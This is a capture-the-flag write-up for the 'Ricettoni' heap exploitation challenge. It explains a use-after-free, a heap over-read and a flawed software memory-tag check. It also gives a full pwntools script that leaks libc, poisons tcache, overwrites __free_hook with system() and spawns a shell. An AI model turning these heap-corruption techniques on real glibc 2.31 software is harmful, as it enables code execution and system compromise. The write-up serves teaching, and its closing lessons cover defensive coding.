# Ricettoni – CTF Challenge Writeup
*Author - Senpai*
**Event:** SK-CERT CyberGame 2026  
**Category:** Binary Exploitation  
**Points:** 493  
**Flag:** `SK-CERT{wh0_74u9h7_y0u_7h15_h34p_f3n95hu1_w1z4rdry}`

---

## Table of Contents
1. [Challenge Description](#1-challenge-description)
2. [Background Knowledge](#2-background-knowledge)
3. [Reconnaissance](#3-reconnaissance)
4. [Vulnerability Analysis](#4-vulnerability-analysis)
5. [Exploit Strategy](#5-exploit-strategy)
6. [Step-by-Step Exploit Walkthrough](#6-step-by-step-exploit-walkthrough)
7. [Full Exploit Script](#7-full-exploit-script)
8. [Lessons Learned](#8-lessons-learned)

---

## 1. Challenge Description

> *"On your trip to Italy, you discovered a new cookbook. You were not amazed, as you already know how to cook. But this one is different. Can you find the secret hidden within?"*

We are given a binary called `ricettoni` (Italian for "big recipes") and a netcat connection. The binary is an Italian-language recipe manager — a classic **heap exploitation** challenge disguised as a cookbook.

**Files provided:**
- `ricettoni` — the binary
- `libc.so.6` — the specific glibc version used on the server
- `ld-linux-x86-64.so.2` — the dynamic linker
- `flag.txt` — a fake placeholder flag
- `Dockerfile` + `docker-compose.yaml` — to run the challenge locally

---

## 2. Background Knowledge

Before diving in, here are the concepts you need to understand. Skip what you already know.

### 2.1 What is the Heap?

When a program runs, it gets memory from the OS in two main areas:
- **Stack** — for local variables and function calls (automatic, fast)
- **Heap** — for dynamic memory allocated at runtime using `malloc()` and freed with `free()`

The heap is like a big pool of memory. `malloc(100)` carves out a 100-byte chunk for you to use. `free()` gives it back.

### 2.2 How glibc Manages Heap Chunks

Every chunk of heap memory has a small **header** (16 bytes on 64-bit) before the actual data:

```
+------------------+  ← chunk start (what free() sees)
|   prev_size (8B) |  size of previous chunk (if free)
+------------------+
|   size (8B)      |  size of THIS chunk | flags
+------------------+  ← malloc() returns this pointer to the user
|   user data...   |
+------------------+
```

So if you call `malloc(0x10)`, you get a chunk of `0x10 + 0x10 (header) = 0x20` bytes total, but the pointer you receive points to the user data area, not the header.

### 2.3 Tcache (Thread Cache)

In glibc 2.26+, freed small chunks go into a **tcache** — a per-thread fast cache organized as a singly-linked list per size class. When you `free()` a chunk, its first 8 bytes are overwritten with a pointer to the next free chunk in that bin (called `fd`). Next `malloc()` of the same size pops from this list.

```
tcache[0x40]: chunk_A → chunk_B → NULL
```

**Tcache poisoning** means overwriting `fd` to point anywhere we want. Next `malloc()` returns our fake address as if it were a valid chunk — letting us write anywhere in memory.

### 2.4 Unsorted Bin

Large freed chunks (not fitting tcache) go into the **unsorted bin** — a doubly-linked list. glibc consolidates adjacent free chunks to prevent fragmentation. So freeing two neighboring large chunks merges them into one big free chunk.

### 2.5 __free_hook

In glibc ≤ 2.33, there's a function pointer called `__free_hook`. If it's non-NULL, `free()` calls it instead of doing normal deallocation:

```c
if (__free_hook != NULL)
    __free_hook(ptr);  // called with the freed pointer
```

If we write `system` to `__free_hook` and then `free()` a chunk containing `/bin/sh`, we get:

```c
system("/bin/sh");  // shell!
```

### 2.6 Memory Tagging Extension (MTE)

ARM MTE is a hardware feature that tags each memory allocation with a random value to detect use-after-free and buffer overflows. This binary **simulates** MTE in software — each allocation gets a random 64-bit tag stored alongside the chunk. Before any read/write/free, the tag is verified.

---

## 3. Reconnaissance

### 3.1 Binary Properties

```
ricettoni: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

Security mitigations:
- **PIE** — binary loaded at random address (ASLR)
- **Full RELRO** — GOT is read-only
- **Stack Canary** — protects against stack buffer overflows
- **NX** — no executable stack
- **No real MTE** — software-simulated only

### 3.2 Program Functionality

The binary presents an Italian menu:

```
1. Aggiungi una nuova ricetta   (Add recipe)
2. Visualizza una ricetta       (View recipe)
3. Elimina una ricetta          (Delete recipe)
4. Esci                         (Exit)
```

It manages up to 16 recipes stored in an array `recipes[16]`. Each slot holds two values: `{ptr, tag}`.

On startup, it calls `read_secret_recipe()` which opens `flag.txt` and stores its contents in a heap allocation — this is what we need to leak/read.

### 3.3 Custom MTE Allocation Scheme

The binary wraps all heap operations with custom MTE functions:

**`MTEalloc(user_size)`:**
```
malloc(user_size + 0x28)        ← extra 0x28 bytes for metadata
random 64-bit tag → ptr + 0x20  ← tag stored at offset +0x20
user data starts at → ptr + 0x28
returns (ptr, tag)
```

**`MTEfree(ptr, tag)`:**
```
1. check_tag(ptr, tag)   ← verify tag matches
2. write new random tag at ptr+0x20
3. free(ptr)
```

**`check_tag(ptr, tag)`:**
```c
stored = *(ptr + 0x20);
return (tag | stored) == tag;
// passes if stored is a SUBSET of tag's bits
// if stored == 0: (tag | 0) == tag → ALWAYS PASSES!
```

**`MTEread(ptr, tag, buf, len)`** and **`MTEwrite(ptr, tag, src, len)`:**
```
check_tag(ptr, tag) → then memcpy
```

---

## 4. Vulnerability Analysis

### Bug 1: Massive Heap Over-read (View)

`view_recipe` calls `MTEread(ptr, tag, buf, 0xFFF)` — it **always reads 0xFFF (4095) bytes** regardless of how much data was actually written. This means viewing any recipe leaks the next ~4KB of heap memory, including pointers from freed chunks nearby.

### Bug 2: Use-After-Free (Delete)

`delete_recipe` decrements `count--` but **never clears the slot**. The stale `{ptr, tag}` pair remains in `recipes[idx]`. If we manipulate `count` back up, we can still access the freed slot.

### Bug 3: Tag Check Bypass

`check_tag` uses bitwise OR logic: `(tag | stored) == tag`. This means:
- If `stored_tag == 0` → `(any | 0) == any` → **always passes**
- So zeroing the tag field at `ptr + 0x20` completely bypasses MTE for that chunk

### Bug 4: No Size Limit on Read (Heap Over-read exploit primitive)

The `MTEread` memcpy uses `0xFFF` as length regardless of chunk size — combined with Bug 1, this is our leak primitive.

---

## 5. Exploit Strategy

Our goal: write `system()` to `__free_hook`, then `free()` a chunk containing `/bin/sh`.

**10-phase plan:**

```
Phase 1:  Leak a libc address via the 0xFFF over-read
Phase 2:  Allocate chunks A, V, GUARD, and fillers
Phase 3:  Free V then A → glibc consolidates into one big free chunk
Phase 4:  Allocate overlapping chunk C → write 0 over V's MTE tag
Phase 5:  Set up tcache[0x40] with PAD, then UAF-free V into it
Phase 6:  Reallocate C2 → poison V's fd to point at __free_hook - 0x28
Phase 7:  Pop V from tcache
Phase 8:  Write "/bin/sh" at V's memory via C3 overlap
Phase 9:  Pop target → write system() to __free_hook
Phase 10: Trigger free(V) → system("/bin/sh")
```

---

## 6. Step-by-Step Exploit Walkthrough

### Phase 1: Libc Leak

At startup, `read_secret_recipe()` calls `fopen("flag.txt", "r")`. This creates a `FILE` structure on the heap containing vtable pointers — specifically `_IO_wfile_jumps` — which is a pointer inside libc.

We allocate a chunk of user size `0x1A8`:
- `MTEalloc(0x1A8)` → `malloc(0x1A8 + 0x28)` = `malloc(0x1D0)` → chunk size `0x1D0`

Then view it. The `0xFFF` over-read reaches past our chunk into the freed FILE struct left by `fopen`, leaking `_IO_wfile_jumps`:

```python
create(io, 0x1A8, b'A' * 0x1A8)   # slot 0
raw = view(io, 0)
# scan raw for a 0x7f... address
libc_leak = ...
libc_base = libc_leak - 0x1e8f60  # _IO_wfile_jumps offset
```

From `libc_base` we can calculate everything:
```python
system_addr = libc_base + 0x52290
free_hook   = libc_base + 0x1eee48
```

### Phase 2: Heap Layout

We set up the heap in a specific order:

```
[slot 0] LEAK   — 0x1A8 bytes (already done)
[slot 1] A      — 0x3F0 bytes → chunk 0x420
[slot 2] V      — 0x3F0 bytes → chunk 0x420  (our UAF victim)
[slot 3] GUARD  — 0x10 bytes  → chunk 0x40   (stops top-chunk merge)
[slot 4] F1     — 0x10 bytes  → chunk 0x40   (filler)
[slot 5] F2     — 0x10 bytes  → chunk 0x40   (filler)
```

The GUARD chunk is critical — it sits between V and the top chunk (the main free region at the end of the heap). Without it, freeing V would merge with the top chunk and ruin our plan.

### Phase 3: Unsorted Bin Consolidation

We free V first, then A:

```python
delete(io, 2)   # free V → goes to unsorted bin
delete(io, 1)   # free A → glibc sees V is free right next to A
                #          merges them: 0x420 + 0x420 = 0x840 chunk
```

Now there's one giant `0x840` free chunk in the unsorted bin. Critically, **slots 1 and 2 still hold the old stale pointers** (UAF).

### Phase 4: Overlapping Allocation — Zero V's Tag

We allocate chunk C with user size `0x440`:
- `MTEalloc(0x440)` → `malloc(0x468)` → chunk `0x470`
- This is carved from the `0x840` unsorted chunk
- C's user data starts at `A_ptr + 0x28`
- V's chunk header is at `A_ptr + 0x420 - 0x10 = A_ptr + 0x410`
- V's MTE tag (at `V_ptr + 0x20`) = `A_ptr + 0x420 + 0x20` = offset `0x418` from C's user data start

So within C's payload, at offset `V_OFF = 0x3F8`, we control V's chunk internals:

```python
V_OFF = 0x3F8  # offset in C's user data to V's chunk start (fd field)

c_payload = bytearray(0x440)
c_payload[V_OFF - 0x08 : V_OFF       ] = p64(0x41)  # fake chunk size 0x40 | PREV_INUSE
c_payload[V_OFF        : V_OFF + 0x08] = p64(0)      # fd = 0
c_payload[V_OFF + 0x08 : V_OFF + 0x10] = p64(0)      # tcache key = 0
c_payload[V_OFF + 0x20 : V_OFF + 0x28] = p64(0)      # ← V's MTE tag = 0 !!!
```

Why `0x41` for the fake size? Because `0x40 | 1` (PREV_INUSE flag set) puts V into `tcache[0x40]` — the same bin as chunks of size `0x40`. This is essential for the tcache poisoning to work.

Now V's stored tag is `0`, so `check_tag` will pass for **any** tag value we supply.

### Phase 5: Tcache Setup

We need `tcache[0x40]` to look like: `[V → PAD]`

```python
# Allocate PAD (0x10 → chunk 0x40) from unsorted remainder
create(io, 0x10, b'PAD')    # slot 5

# Free PAD → tcache[0x40]: [PAD]
delete(io, 5)

# BUMP: must use size 0x20 (chunk 0x50) — DIFFERENT tcache bin!
# If we used 0x10 again it would pop PAD from tcache[0x40] instead
create(io, 0x20, b'BUMP')   # slot 5

# UAF-free V: stored tag is 0, so check_tag passes with V's old tag
delete(io, 2)               # tcache[0x40]: [V → PAD]

# Free C back to unsorted bin
delete(io, 4)
```

### Phase 6: Tcache Poisoning

We reallocate C2 (same size as C), which comes from the unsorted bin again. This time we write our poison into V's `fd` field:

```python
target = free_hook - 0x28  # why -0x28? MTEwrite does memcpy(ptr+0x28, data, len)
                             # so ptr+0x28 = free_hook means ptr = free_hook-0x28

c2_payload[V_OFF       : V_OFF+0x08] = p64(target)  # poison V's fd!
c2_payload[V_OFF + 0x20: V_OFF+0x28] = p64(0)        # keep tag=0
```

Now `tcache[0x40]` looks like: `[V → (free_hook - 0x28)]`

### Phase 7: Pop V from Tcache

```python
create(io, 0x10, b'X' * 0x10)   # slot 5, gets V_ptr
# tcache[0x40]: [(free_hook - 0x28)]
```

### Phase 8: Write "/bin/sh" at V

We need `V_ptr[0..7]` to contain `/bin/sh\0` so that when `free(V_ptr)` is called, `system(V_ptr)` = `system("/bin/sh")`.

We free C2 and reallocate C3 with the same overlap, writing `/bin/sh` at the right offset:

```python
c3_payload[V_OFF : V_OFF+8] = b'/bin/sh\x00'
c3_payload[V_OFF+0x20 : V_OFF+0x28] = p64(0)  # keep tag=0
create(io, 0x440, bytes(c3_payload))   # slot 6, C3
```

### Phase 9: Write system() to __free_hook

The next `malloc(0x10 + 0x28) = malloc(0x38)` → chunk `0x40` pops from `tcache[0x40]`, giving us `free_hook - 0x28`. The binary's `MTEwrite` then does:

```
memcpy((free_hook - 0x28) + 0x28, data, 0x10)
= memcpy(free_hook, p64(system_addr), 0x10)
```

`__free_hook` now points to `system()`!

```python
create(io, 0x10, p64(system_addr))   # slot 7, writes system to __free_hook
```

### Phase 10: Trigger

```python
delete(io, 5)   # MTEfree(V_ptr, tag)
                # check_tag: stored=0 → passes
                # free(V_ptr) → __free_hook(V_ptr) → system(V_ptr)
                # V_ptr[0..7] = "/bin/sh\0"
                # → system("/bin/sh") → SHELL!
```

---

## 7. Full Exploit Script

```python
#!/usr/bin/env python3
"""
Unsorted Bin Overlap + Tcache Poison + __free_hook overwrite
"""
from pwn import *
import struct, sys

context.arch = 'amd64'
context.log_level = 'info'

LOCAL = '--remote' not in sys.argv
if LOCAL:
    io = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './ricettoni'])
else:
    io = remote('127.0.0.1', 38001)  # change to real host/port

# Libc offsets (glibc 2.31-0ubuntu9.18)
LEAK_OFF      = 0x1e8f60   # _IO_wfile_jumps
FREE_HOOK_OFF = 0x1eee48   # __free_hook
SYSTEM_OFF    = 0x52290    # system()
A_CHUNK_SIZE  = 0x420
V_OFF         = A_CHUNK_SIZE - 0x28  # 0x3F8
C_USER        = 0x440

def menu():
    io.recvuntil(b"opzione: ")

def create(sz, data):
    menu(); io.sendline(b'1')
    io.recvuntil(b'lunghezza della ricetta: ')
    io.sendline(str(sz).encode())
    io.recvuntil(b'Inserisci la ricetta: ')
    io.send(data.ljust(sz, b'\x00')[:sz] if isinstance(data, bytes) else data.encode().ljust(sz, b'\x00')[:sz])

def view(idx):
    menu(); io.sendline(b'2')
    io.recvuntil(b'visualizzare: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Ricetta: ')
    return io.recvuntil(b'\n', drop=True)

def delete(idx):
    menu(); io.sendline(b'3')
    io.recvuntil(b'eliminare: ')
    io.sendline(str(idx).encode())

def make_c_payload(fd_val=0):
    p = bytearray(C_USER)
    struct.pack_into('<Q', p, V_OFF - 0x08, 0x41)   # fake size
    struct.pack_into('<Q', p, V_OFF + 0x00, fd_val)  # fd
    struct.pack_into('<Q', p, V_OFF + 0x08, 0)       # tcache key
    struct.pack_into('<Q', p, V_OFF + 0x20, 0)       # MTE tag = 0
    return bytes(p)

# Phase 1: Leak
io.recvuntil(b'Ricetta segreta caricata!\n')
create(0x1A8, b'\x01' * 0x1A8)
data = view(0)
leak = u64(data[-6:].ljust(8, b'\x00'))
libc_base   = leak - LEAK_OFF
free_hook   = libc_base + FREE_HOOK_OFF
system_addr = libc_base + SYSTEM_OFF
target      = free_hook - 0x28
log.success(f"libc_base={libc_base:#x}  system={system_addr:#x}  hook={free_hook:#x}")

# Phase 2: Layout
create(0x3F0, b'A' * 8)   # slot 1
create(0x3F0, b'V' * 8)   # slot 2
create(0x10,  b'G' * 8)   # slot 3 GUARD
create(0x10,  b'F1')      # slot 4
create(0x10,  b'F2')      # slot 5

# Phase 3: Consolidate
delete(2); delete(1)

# Phase 4: Overlap C, zero V tag
create(C_USER, make_c_payload())   # slot 4

# Phase 5: Tcache setup + UAF
create(0x10, b'PAD')    # slot 5
delete(5)               # tcache[0x40]: [PAD]
create(0x20, b'BUMP')   # slot 5 (0x50 bin)
delete(2)               # UAF free V → tcache[0x40]: [V→PAD]
delete(4)               # free C

# Phase 6: Poison
create(C_USER, make_c_payload(fd_val=target))   # slot 4, C2

# Phase 7: Pop V
create(0x10, b'X' * 0x10)   # slot 5, POP_V

# Phase 8: /bin/sh at V
create(0x20, b'FILL')        # slot 6
delete(4)                    # free C2
c3 = bytearray(C_USER)
c3[V_OFF:V_OFF+8] = b'/bin/sh\x00'
struct.pack_into('<Q', c3, V_OFF + 0x20, 0)
create(C_USER, bytes(c3))    # slot 6, C3

# Phase 9: system → __free_hook
create(0x10, p64(system_addr))   # slot 7, POP_T

# Phase 10: Trigger
log.info("Triggering system('/bin/sh')...")
delete(5)

log.success("Shell!")
io.sendline(b'cat flag.txt')
io.interactive()
```

---

## 8. Lessons Learned

### For Beginners

**1. Always check for off-by-one reads**
The view function reading `0xFFF` bytes regardless of chunk size is a classic mistake. Always audit `memcpy` and `read` calls — does the length match the actual allocation?

**2. Nullify pointers after free**
The UAF here only exists because `count--` was used instead of actually clearing `recipes[idx] = {NULL, 0}`. Always zero out pointers after freeing.

**3. Don't roll your own security**
The custom MTE implementation had a logical flaw in `check_tag`. Real ARM MTE is hardware-enforced — software reimplementations are easy to get wrong.

**4. glibc 2.31 is still vulnerable**
`__free_hook` was removed in glibc 2.34. This challenge deliberately ships glibc 2.31 to keep the classic hook-overwrite technique viable.

### Key Techniques Used

| Technique | What it does |
|---|---|
| Heap over-read | Leaks libc pointer from adjacent freed FILE struct |
| Unsorted bin consolidation | Merges two large free chunks into one big chunk |
| Overlapping allocation | One chunk's user data overlaps another chunk's metadata |
| MTE tag zeroing | Sets stored tag to 0, bypassing all tag checks |
| Tcache poisoning | Overwrites a free chunk's `fd` pointer to redirect next malloc |
| `__free_hook` overwrite | Replaces free's function pointer with `system()` |

### Tools Used
- `pwntools` — Python CTF exploitation library
- `objdump` — disassembly
- `readelf` — ELF analysis
- `strings` — quick recon
- Docker — local challenge hosting

---
